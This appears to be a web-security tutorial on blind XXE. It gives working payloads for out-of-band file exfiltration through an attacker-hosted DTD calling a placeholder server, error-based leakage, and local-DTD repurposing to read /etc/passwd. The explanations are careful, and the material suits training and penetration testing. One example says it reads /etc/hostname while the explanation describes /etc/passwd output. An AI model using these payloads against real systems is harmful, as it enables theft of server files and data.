# 03 — Blind XXE: Out-of-Band (OOB) and Error-Based Exfiltration

## Real-World Framing

Most real-world XXE is blind. Production applications generally don't echo raw internal
file contents back to the user — that would be an obvious red flag even to developers
who never thought about XXE specifically. What they often *don't* think to block is the
server quietly making an outbound network connection while parsing your XML. That gap
is what blind XXE exploits. This is also exactly the scenario Burp Collaborator (or
self-hosted equivalents like `interactsh`, `dnslog.cn`-style services) was built for:
proving server-side interaction happened, even when the HTTP response tells you nothing.

## Step 1: Detecting Blind XXE with Out-of-Band Techniques

Before trying to exfiltrate anything, first confirm the entity is being resolved at
all, using a domain you control or a Collaborator-generated subdomain:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- `SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/"` — instead of `file://`, the URI
  scheme is `http://`, and the host is a unique subdomain tied to your OOB listener.
  When the parser resolves this entity, it performs a DNS lookup for that subdomain and
  then an HTTP request to it — both of which your listener logs.
- If you see a DNS interaction (and possibly an HTTP hit) on your listener, you've
  confirmed the parser resolves external entities server-side, *even though the HTTP
  response to you said nothing at all*. This is the single most important confirmation
  step for blind XXE and should be tried before assuming a target is not vulnerable just
  because nothing came back in-band.

## Step 2: Exfiltrating Data Out-of-Band

Confirming interaction is not the same as stealing data — the entity above never sends
*file contents* anywhere, only proof that resolution happened. To exfiltrate a file's
contents via OOB, you need the parameter-entity "DTD builder" pattern from file 2,
because a general entity's `SYSTEM` value can't directly combine "read this local file"
with "send it to this external host" in one step.

### The Malicious External DTD (hosted on attacker infrastructure)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?x=%file;'>">
%eval;
%exfil;
```

Save this as, say, `evil.dtd` on a server you control (an HTTP listener you can log
requests against, or a Collaborator-style endpoint).

### The Payload Sent to the Vulnerable Application

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd"> %xxe; ]>
<stockCheck><productId>3</productId></stockCheck>
```

### Piece-by-Piece Breakdown

**The application-facing payload:**
- `<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">` — a parameter entity whose
  value is fetched from an *external* URL rather than defined inline. The vulnerable
  parser will make an HTTP request to your server to retrieve this DTD content.
- `%xxe;` — referencing the parameter entity at the DTD level causes the fetched DTD
  content (the `evil.dtd` file above) to be parsed and expanded in place, as if it had
  been written directly inside the original `<!DOCTYPE ...>` block.

**Inside `evil.dtd`, which now runs as if it were part of the target's own DTD:**
- `<!ENTITY % file SYSTEM "file:///etc/hostname">` — defines a parameter entity whose
  value is the contents of a local file on the *vulnerable server* (this resolves
  locally on the target, not on your attacker server — the DTD is fetched remotely, but
  it executes in the context of the target's parser).
- `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?x=%file;'>">` —
  this is the critical trick. It defines a second parameter entity, `eval`, whose value
  is itself a string containing a *new entity declaration* — one that defines `exfil` as
  an external entity pointing back at your server, with the file's contents appended as
  a query string parameter via `%file;`. The `&#x25;` is the numeric character
  reference for `%` — it has to be encoded this way here because a literal `%` inside an
  entity's *value* would be misinterpreted by the parser as starting another parameter
  entity reference immediately, rather than as a literal character to be written out
  when `eval` is later expanded.
- `%eval;` — expanding this parameter entity causes the parser to actually write the
  `<!ENTITY % exfil SYSTEM '...'>` declaration into the DTD for real, with `%file;`
  already substituted in as the live file contents at this point.
- `%exfil;` — finally, referencing this newly-created entity triggers the actual outbound
  HTTP request, with the stolen file's contents embedded directly in the URL your server
  receives. Reading your server's access log shows the exfiltrated data in the request
  path/query string.

### Real-World Note

This three-entity chain (`file` → `eval` → `exfil`) is the canonical blind XXE OOB
exfiltration pattern and appears, with minor cosmetic variation, in essentially every
real-world blind XXE writeup and every blind XXE automation tool, including XXEinjector
(file 5). Understanding why each entity exists — read locally, build a new entity
string, then trigger it — means you can adapt this pattern even when a target's parser
has quirks that break a copy-pasted payload.

## Step 3: Error-Based Exfiltration (When OOB Is Blocked)

Some environments have strict egress filtering: the application server simply cannot
make outbound connections to arbitrary internet hosts, so OOB techniques produce
nothing. In that case, data can sometimes still be exfiltrated by forcing the XML
parser to throw a parsing error that includes the sensitive data inside the error
message text itself, which often *does* get returned to you even in an otherwise blind
application (many frameworks leak verbose stack traces or parser error details, even
when they carefully avoid leaking "real" application output).

### The Malicious External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Piece-by-Piece Breakdown

- The `file` and `eval` entities work exactly as in the OOB chain above — read a local
  file, then build a new entity declaration referencing its contents.
- The difference is in what the newly-built entity (`error`) actually points to:
  `file:///nonexistent/%file;` — a filesystem path that almost certainly does not exist,
  with the stolen file's contents appended directly into the path string.
- When the parser tries to resolve `%error;`, it attempts to open a file at a path like
  `/nonexistent/root:x:0:0:root:/root:/bin/bash...` (the literal content of
  `/etc/passwd` jammed into a path), which obviously fails — but the resulting "file not
  found" error message many parsers generate *includes the invalid path it tried to
  open*, meaning the stolen file contents land directly in the error text, which the
  application then displays or logs in a way you can read.

### Real-World Note: Repurposing a Local DTD

Sometimes you can't host your own external DTD at all (extremely strict egress rules
block even the initial fetch of `evil.dtd`). In that case, an advanced fallback is to
**repurpose a DTD that already exists locally on the target server** — many Linux
systems with desktop environments installed (e.g. GNOME) ship DTD files like
`/usr/share/yelp/dtd/docbookx.dtd`, which define a number of entities you don't control
the names of, but which you can *redefine*:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; xxe SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; error "<!ENTITY &#x26;#x25; trigger SYSTEM \'file:///nonexistent/&#x25;xxe;\'>">
  '>
  %local_dtd;
]>
```

- `<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">` — loads a DTD
  that already exists on the server's own filesystem rather than fetching one over the
  network, sidestepping any egress filtering entirely since this is a purely local file
  read.
- `<!ENTITY % ISOamso '...'>` — this deliberately **redefines** an entity (`ISOamso`)
  that the legitimate DTD already declares. Per the XML specification, the *first*
  definition of a given parameter entity name wins, so this redefinition must be
  declared *before* `%local_dtd;` is expanded — which is why it appears earlier in the
  internal subset even though it conceptually "overrides" something from the external
  file loaded afterward.
- When `%local_dtd;` is later expanded, the legitimate DTD's own internal reference to
  `%ISOamso;` (which exists somewhere inside that real DTD file, used for an entirely
  unrelated, legitimate purpose) ends up triggering *your* redefined version instead —
  cascading into the same local-file-read-then-error-leak chain described above, fully
  evading any need to reach the internet at all.

This is one of the more advanced XXE techniques you'll encounter and is generally only
necessary against hardened, network-isolated targets — but it demonstrates how deep
parser-level mechanics can be pushed when simpler exfiltration paths are closed off.

## What's Next

File 4 shifts focus from data exfiltration to using XXE purely as a network access
primitive — chaining XXE into SSRF to reach internal services and cloud metadata
endpoints, whether or not any data ever comes back to you directly.
